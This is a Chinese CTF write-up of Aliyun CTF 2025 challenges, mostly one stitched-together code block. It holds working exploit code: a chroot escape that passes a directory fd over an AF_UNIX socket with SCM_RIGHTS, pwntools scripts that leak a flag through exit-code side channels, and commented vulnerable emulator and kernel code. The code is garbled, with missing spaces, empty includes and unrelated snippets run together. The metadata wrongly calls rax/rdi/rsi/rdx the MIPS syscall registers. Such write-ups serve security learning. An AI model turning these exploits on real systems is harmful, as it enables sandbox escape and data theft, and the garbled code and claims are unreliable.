---
title: 阿里云CTF2025复现-风清
contest: 阿里云CTF
year: 2025
difficulty: hard
vuln_type: reverse
tags:
- MIPS
- 手搓syscall
- seccomp
- 栈use-after-scope
- 朴素寄存器分配
- 时间侧信道
- chroot逃逸
- SCM_RIGHTS
- sendmsg
- mmap覆盖
- BadVAddr
attack_chain: 'runes: mmap+syscall(MIPS)+chroot+SCM_RIGHTS+send_fd+recv_fd+8次chdir(..)+open flag|stack use-after-scope: 朴素寄存器分配flush_cache后ra寄存器+time侧信道通过exit_code|chroot逃逸: mkdir foo; chroot foo; cd .. 经典套路|send_fd/recv_fd: AF_UNIX socket+SCM_RIGHTS+CMSG_DATA传fd|fchdir+open: 用收到的cwd_fd 8次..回到根|fuzz: AFL++4.08c + QEMU persistent ASAN_OPTIONS detect_leaks=0|BadVAddr覆盖: set_mem_word覆盖text_seg指令+free_inst触发UAF|mem_reference: TEXT_BOT 0x400000 / DATA_BOT 0x10000000 / STACK_TOP 0x80000000'
one_liner: 阿里云CTF2025复现风清:runes(MIPS+chroot+SCM_RIGHTS+AF_UNIX+send_fd/recv_fd+8次chdir逃逸+open flag)+stack use-after-scope(朴素寄存器分配+时间侧信道+exit_code -11 vs -31)+mmap BadVAddr覆盖+seccomp dump+AFL++4.08c
lesson: 1) MIPS手搓syscall:rax=syscall号,rdi/rsi/rdx=参数;2) chroot逃逸:mkdir foo; chroot foo; cd ..;3) AF_UNIX+SCM_RIGHTS传fd:CMSG_DATA(cmsg) memcpy &fd;4) 时间侧信道:exit_code -11(SIGSEGV)/-31(SIGSYS)区分位;5) seccomp-tools dump -p `pidof binary`;6) BadVAddr覆盖:__readfsqword+xmmword+set_mem_word;7) AFL++ QEMU persistent:ASAN_OPTIONS=detect_leaks=0
quality: high
full_path: 阿里云CTF2025复现-风清.full.md
meta_path: 阿里云CTF2025复现-风清.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 阿里云CTF2025复现-风清。阿里云CTF2025复现风清:runes(MIPS+chroot+SCM_RIGHTS+AF_UNIX+send_fd/recv_fd+8次chdir逃逸+open flag)+stack use-after-scope(朴素寄存器分配+时间侧信道+exit_code -11 vs -31)+mmap BadVAddr覆盖+seccomp dump+AFL++...
category: reverse
subcategory: reverse
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/233011.html
reasoning_chain:
- runes 题目 mmap+syscall → 触发点：用户态可调 syscall
- 假设：MIPS 手搓 syscall rax=号 rdi/rsi/rdx=参数 → 动作：调 open/read/write
- chroot 沙箱 → 假设：mkdir foo; chroot foo; cd .. 逃逸 → 动作：8 次 chdir(..)
- 假设：AF_UNIX socket + SCM_RIGHTS 传 fd → 动作：send_fd/recv_fd
- 观察：拿到 cwd_fd → open flag 成功
- stack use-after-scope → 触发点：朴素寄存器分配 flush_cache 后 ra 仍存旧值
- 假设：时间侧信道 exit_code 区分 → 动作：-11(SIGSEGV)/-31(SIGSYS) → 位 leak
- mmap BadVAddr → 假设：__readfsqword+xmmword+set_mem_word 覆盖 text_seg
- 动作：free_inst 触发 UAF → 写 shellcode 到栈
- AFL++4.08c + QEMU persistent + ASAN_OPTIONS=detect_leaks=0 fuzz
failed_attempts:
- 试图不解 MIPS 构造、靠纯汇编 libc → 失败：man 手册查最新 syscall 才是关键
- 试图不开 seccomp 直接打 → 失败：seccomp 拦截 syscall
key_observations:
- MIPS 手搓 syscall 必须查最新 man 手册（不同内核版本差异）
- chroot 逃逸标配：mkdir foo; chroot foo; cd ..
- AF_UNIX + SCM_RIGHTS + CMSG_DATA 是传 fd 经典手法
- 时间侧信道 exit_code -11 vs -31 是侧信道位 leak 通用做法
- AFL++ QEMU persistent + ASAN_OPTIONS=detect_leaks=0 是 fuzz 标配
prerequisites:
- MIPS syscall 约定（rax/rdi/rsi/rdx）
- chroot/AF_UNIX/SCM_RIGHTS 进程间通信
- seccomp-tools dump 规则分析
- AFL++ QEMU persistent 模式 + ASan 配置
---
# 阿里云CTF2025复现-风清

> 原文: https://www.ctfiot.com/233011.html
> ID: 233011

阿里云CTF2025复现-风清

runes

题目程序比较简单，就是 mmap 了一段内存，然后能任意使用 syscall。

这道题学到的最重要的一点就是不同的内核版本的系统调用可能会存在一定的区别，然后还是得看 man 手册，ai 在这个时候还是有点吃力

然后只要看最高版本的man就可以了，会把一些系统调用更改的历史都描述出来

stack use-after-scope

朴素寄存器分配算法

直接用时间侧信道

这个的话感觉要结合程序的运行情况才行了

这个之前用过一次，就是在脚本里用来接受信号的代码需要注意一下[ p.poll(True) ]

文末:

欢迎师傅们加入我们:

星盟安全团队纳新群1:
222328705

星盟安全团队纳新群2:
346014666

有兴趣的师傅欢迎一起来讨论!

PS:
团队纳新简历投递邮箱：

xmcve@qq.com

责任编辑：@Elite


```
case IR_CALL: {
      cprintl("addi $sp,$sp,-%d", ir->in_cnt * 4);    
      for (int i = 1; i <= ir->in_cnt; ++i) {
        cprintl("sw $%d,%d($sp)", op2reg(&ir->ops[i]), 4 * (i - 1)); 
      }
      flush_cache();// 在这里刷新寄存器，写回内存
      constchar *n = ir->ops[0].name;
      if (strcmp(n, "main") == 0) {
        cputl("jal main");
      } else {
        cprintl("jal .F%s", ir->ops[0].name);
      }
   cprintl("addi $sp,$sp,%d", ir->in_cnt * 4);        // 可能的问题       
      reset_cache();
      int wr = reg_for_write(ir->out.var->off);
      emit_mov(wr, REG_RET);
      break;
    }
struct vuln_stru{
 int v1;
int v2;
int v3;
int v4;
};

struct vuln_stru fn(){
struct vuln_stru vs;
return vs;
}

int empty(struct vuln_stru vs){
return1;
}

int vuln(struct vuln_stru vs){
struct vuln_stru vs2;
 empty(vs);
 vs.v4 = 1; // 更改 ra 寄存器
 vs.v3 = 2; // 更改 vs2 的指针

 vs2.v1 = 1; // 这里程序会被中断，因为会往 0x2 这里写入，但是会写入失败
return1;
}

int main(){
 vuln(fn());
return0;
}
R[RD(inst)] = R[RS(inst)] + R[RT(inst)];
    #define RD(INST) (INST)->r_t.r_i.r_i.r.rd
    #define SET_RD(INST, VAL) (INST)->r_t.r_i.r_i.r.rd = (unsigned char)(VAL)
    #define R_LENGTH 32
reg_word R[R_LENGTH];
    #define TEXT_BOT ((mem_addr)0x400000)
    #define DATA_BOT ((mem_addr)0x10000000)
    #define STACK_TOP ((mem_addr)0x80000000)
    #define K_TEXT_BOT ((mem_addr)0x80000000)
    #define K_DATA_BOT ((mem_addr)0x90000000)
    #define MM_IO_BOT ((mem_addr)0xffff0000)
    #define MM_IO_TOP ((mem_addr)0xffffffff)
case READ_SYSCALL: {
      /* Test if address is valid */
      (void)mem_reference(R[REG_A1] + R[REG_A2] - 1);
    #ifdef _WIN32
      R[REG_RES] = _read(R[REG_A0], mem_reference(R[REG_A1]), R[REG_A2]); // 核心在这里
    #else
      R[REG_RES] = read(R[REG_A0], mem_reference(R[REG_A1]), R[REG_A2]);
    #endif
      data_modified = true;
      break;
    }
void *mem_reference(mem_addr addr) {
if ((addr >= TEXT_BOT) && (addr < text_top))
    return addr - TEXT_BOT + (char *)text_seg;
elseif ((addr >= DATA_BOT) && (addr < data_top))
    return addr - DATA_BOT + (char *)data_seg;
elseif ((addr >= stack_bot) && (addr < STACK_TOP))
    return addr - stack_bot + (char *)stack_seg;
elseif ((addr >= K_TEXT_BOT) && (addr < k_text_top))
    return addr - K_TEXT_BOT + (char *)k_text_seg;
elseif ((addr >= K_DATA_BOT) && (addr < k_data_top))
    return addr - K_DATA_BOT + (char *)k_data_seg;
else {
    run_error("Memory address out of boundsn");
    returnNULL;
  }
}
int fd;
fd = open(0);
write(fd,addr,118);

read(fd,addr2,118);
close(fd);
static void bad_mem_write(mem_addr addr, mem_word value, int mask) {
  mem_word tmp;

if ((addr & mask) != 0) /* Unaligned address fault */
    RAISE_EXCEPTION(ExcCode_AdES, CP0_BadVAddr = addr)
elseif (addr >= TEXT_BOT && addr < text_top) {
    if (text_seg[(addr - TEXT_BOT) >> 2] == NULL) {
      /* No instruction at address. Only create instruction from
               full-word write. */
        ......
    } else {
      switch (mask) {
          ......
      }
      free_inst(text_seg[(addr - TEXT_BOT) >> 2]); // 问题在这里
    }
void set_mem_byte(mem_addr addr, reg_word value);
void set_mem_half(mem_addr addr, reg_word value);
void set_mem_word(mem_addr addr, reg_word value);
chroot() changes the root directory of the calling process to that specified in path.  This directory will be used for pathnames beginning with /.  The root directory is inherited by all children of the calling process.

    Only a privileged process (Linux: one with the CAP_SYS_CHROOT capability in its user namespace) may call chroot().

    This  call  changes  an ingredient in the pathname resolution process and does nothing else.  In particular, it is not intended to be used for any kind of security purpose, neither to fully sandbox a process nor to restrict filesystem system calls.  In the
    past, chroot() has been used by daemons to restrict themselves prior to passing paths supplied by untrusted users to system calls such as open(2).  However, if a folder is moved out of the chroot directory, an attacker can exploit that to get  out  of  the
    chroot directory as well.  The easiest way to do that is to chdir(2) to the to-be-moved directory, waitfor it to be moved out, then open a path like ../../../etc/passwd.

    A  slightly  trickier  variation also works under some circumstances ifchdir(2) is not permitted.  If a daemon allows a "chroot directory" to be specified, that usually means that if you want to prevent remote users from accessing files outside the chroot
    directory, you must ensure that folders are never moved out of it.

    This call does not change the current working directory, so that after the call '.' can be outside the tree rooted at '/'.  In particular, the superuser can escape from a "chroot jail" by doing:

        mkdir foo; chroot foo; cd ..

    This call does not close open file descriptors, and such file descriptors may allow access to files outside the chroot tree.
/parent_directory
│── flag
│── test
    │── flagg
    │── [new filesystem]
    │── chroot_test
    #include 
    #include <sys/syscall.h>
    #include <stdio.h>
    #include <stdlib.h>

int main() {
    // 将当前目录设为新的根目录
    if (syscall(SYS_chroot, "./test") != 0) {
        perror("chroot");
        exit(EXIT_FAILURE);
    }

    // 直接读取 /flag
    constchar *path = "/flagg";
    constchar *args[] = {path, NULL};
    if (syscall(SYS_open, path,0,0,0) != 0) {
        perror("open flag");
        exit(EXIT_FAILURE);
    }

    // 读取工作目录中的 flag
    constchar *pathh = "flag";
    if (syscall(SYS_open, pathh,0,0,0) != 0) {
        perror("open yuan flag");
        exit(EXIT_FAILURE);
    }

    return0;
}
    #include 
    #include <sys/syscall.h>
    #include <stdio.h>
    #include <stdlib.h>

int main() {
    // 将当前目录设为新的根目录
    if (syscall(SYS_chroot, "./test") != 0) {
        perror("chroot");
        exit(EXIT_FAILURE);
    }

    // 使用系统调用创建一个新的文件夹 "newdir"
    if (syscall(SYS_mkdir, "newdir", 0755) != 0) {
        perror("mkdir");
        exit(EXIT_FAILURE);
    }

    return0;
}
/parent_directory
│── flag
│── test
    │── flagg
    │── [new filesystem]
    │── chroot_test
│── newdir
 │──
/                 # 根目录（假设 chroot 之前的原始系统）
│
├── parent_parent/     # 父父目录
│   ├── flaggg
│   └── parent/        # 父目录
│       ├── flag
│       └── chroot_dir/  # chroot 监狱
│           ├── flagg
│           ├── chroot_test
│           └── [其他文件/子目录]
    #include 
    #include <sys/syscall.h>
    #include <stdio.h>
    #include <stdlib.h>

int main() {
    // 将当前目录设为新的根目录
    if (syscall(SYS_chroot, ".") != 0) {
        perror("chroot");
        exit(EXIT_FAILURE);
    }
    // 读取工作目录中的 flag
    constchar *pathh = "../flag";
    if (syscall(SYS_open, pathh,0,0,0) != 0) {
        perror("open yuan flag");
        exit(EXIT_FAILURE);
    }
    return0;
}
    #include 
    #include <sys/syscall.h>
    #include <stdio.h>
    #include <stdlib.h>

int main() {
    // 将当前目录设为新的根目录
    if (syscall(SYS_chroot, "./test") != 0) {
        perror("chroot");
        exit(EXIT_FAILURE);
    }
    // 读取工作目录中的 flag
    constchar *pathh = "../flaggg";
    if (syscall(SYS_open, pathh,0,0,0) != 0) {
        perror("open yuan flag");
        exit(EXIT_FAILURE);
    }
    return0;
}
# # === same effect as above ===
$ ./program 3< /any/path
// send.c
constint SOCK_NAME=0x006a6a00;

__always_inline static void send_fd(int socket, int fd) {
    struct msghdr msg = {0};
    struct iovec iov;
    char buffer[1] = {0};
    char cmsg_buffer[CMSG_SPACE(sizeof(int))];
    
    msg.msg_control = cmsg_buffer;
    msg.msg_controllen = sizeof(cmsg_buffer);
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    __builtin_memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));

    iov.iov_base = buffer;
    iov.iov_len = sizeof(buffer);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    syscall3(SYS_sendmsg,socket, (long)&msg, 0);
}

__attribute__((naked)) void main() {
    long sig = 1<<(SIGALRM-1);
    syscall4(SYS_rt_sigprocmask,0,(long)&sig,0,8);
    int client_socket = raw_socket(AF_UNIX, SOCK_STREAM, 0);
    struct sockaddr_un addr = {0};
    addr.sun_family = AF_UNIX;
    __builtin_memcpy(addr.sun_path,&SOCK_NAME,4);
    syscall3(SYS_connect,client_socket, (long)(struct sockaddr *)&addr, sizeof(addr));
    short path;
    __builtin_memcpy(&path,".",2);
    int cwd_fd = syscall2(SYS_open,(long)&path, O_RDONLY);
    send_fd(client_socket, cwd_fd);
}
// recv.c
constint SOCK_NAME=0x006a6a00;

__always_inline static int recv_fd(int socket) {
    struct msghdr msg = {0};
    struct iovec iov;
    char buffer[1];
    char cmsg_buffer[CMSG_SPACE(sizeof(int))];
    msg.msg_control = cmsg_buffer;
    msg.msg_controllen = sizeof(cmsg_buffer);
    iov.iov_base = buffer;
    iov.iov_len = sizeof(buffer);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    syscall3(SYS_recvmsg,socket, (long)&msg, 0);
    //return *(int *)CMSG_DATA(CMSG_FIRSTHDR(&msg));
    return *(int *)((((struct cmsghdr *) (&msg)->msg_control))->__cmsg_data);
}

__attribute__((naked)) void main() {
    long sig = 1<<(SIGALRM-1);
    syscall4(SYS_rt_sigprocmask,0,(long)&sig,0,8);
    int server_socket = raw_socket(AF_UNIX, SOCK_STREAM, 0);
    struct sockaddr_un addr = {0};
    addr.sun_family = AF_UNIX;
    __builtin_memcpy(addr.sun_path,&SOCK_NAME,4);
    syscall3(SYS_bind,server_socket, (long)(struct sockaddr *)&addr, sizeof(addr));
    syscall2(SYS_listen,server_socket, 5);
    int client_socket = syscall3(SYS_accept,server_socket, 0,0);
    int received_fd = recv_fd(client_socket);
    syscall1(SYS_fchdir,received_fd);
    int dir;
    __builtin_memcpy(&dir,"..",3);
    for(int i=0;i<8;++i)
        syscall1(SYS_chdir,(long)&dir);
    char buf[5];
    __builtin_memcpy(buf,"flag",5);
    int ffd=syscall2(SYS_open,(long)buf,0);
    char buf2[64];
    syscall3(SYS_read,ffd,(long)buf2,64);
    syscall3(SYS_write,1,(long)buf2,64);
}
from pwn import *

elf = context.binary = ELF('./binary')

PAYLOAD = asm("""
    mov rax, 0
    mov rdi, 3
    lea rsi, [rsp-100]
    mov rdx, 100
    syscall
    mov al, BYTE PTR [rsi+1]  # 8a 46 01
    and al, 2                 # 24 02
    jnz crash
    ret
crash:
    mov BYTE PTR [rax], 0
""")

def get_bit(offset):
    p = process([elf.path, '/flag'])
    byte = offset // 8
    bit = offset % 8
    
    payload = PAYLOAD  # Replace byte and bit placeholders
    payload = payload.replace(b"x8ax46x01", bytes([0x8a, 0x46, byte]))
    payload = payload.replace(b"x24x02", bytes([0x24, 1 << bit]))

    p.send(payload)
    exit_code = p.poll(True)  # Block until exit
    p.close()
    
    if exit_code notin [-11, -31]:
        return get_bit(offset)  # something unexpected happened, try again
    
    return exit_code == -11

flag = b""
binary = ""
i = 0
whilenot flag.endswith(b"}"):
    binary = ("1"if get_bit(i) else"0") + binary
    print(f"{binary: >8}")  # Build out byte in binary first
    
    if len(binary) == 8:  # If full byte, convert to ASCII
        flag += bytes([int(binary, 2)])
        binary = ""
        print(flag)
    
    i += 1
from pwn import *

elf = context.binary = ELF('./binary')

flag = b""
for i in range(100):
    # Dynamically compile the assembly needed
    payload = asm(f"""
        mov rax, 0
        mov rdi, 3
        lea rsi, [rsp-100]
        mov rdx, 100
        syscall
        mov rax, 60
        mov rdi, [rsi+{i}]  # <- insert i (offset) here
        syscall
    """)
    p = process()
    p.send(payload)

    exit_code = p.poll(True)  # Block until program exits
    flag += bytes([exit_code])
    print(flag)

    p.close()
$ sudo seccomp-tools dump -p 1337
$ sudo seccomp-tools dump -p `pidof binary`
rcu_read_lock();
 if (!pages[idx]) {
  rcu_read_unlock();
return -EINVAL;
 }
 page = rcu_dereference(pages[idx]);
if (page) {
phys_addr_t phys = page->phys;
  vma->vm_ops = &alimem_vm_ops;
  vma->vm_private_data = page;
  vm_flags_set(vma, vma->vm_flags | VM_DONTEXPAND | VM_DONTDUMP);
  rcu_read_unlock(); // 在这里提前解锁了，导致可能存在条件竞争
if (remap_pfn_range(vma, vma->vm_start, phys >> PAGE_SHIFT,
        vma->vm_end - vma->vm_start,
        vma->vm_page_prot)) {
   return -EAGAIN;
  }

  atomic_inc(&page->refcount);
return0;
 }
 rcu_read_unlock();
return ret;
while (!t) {};
gef help
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]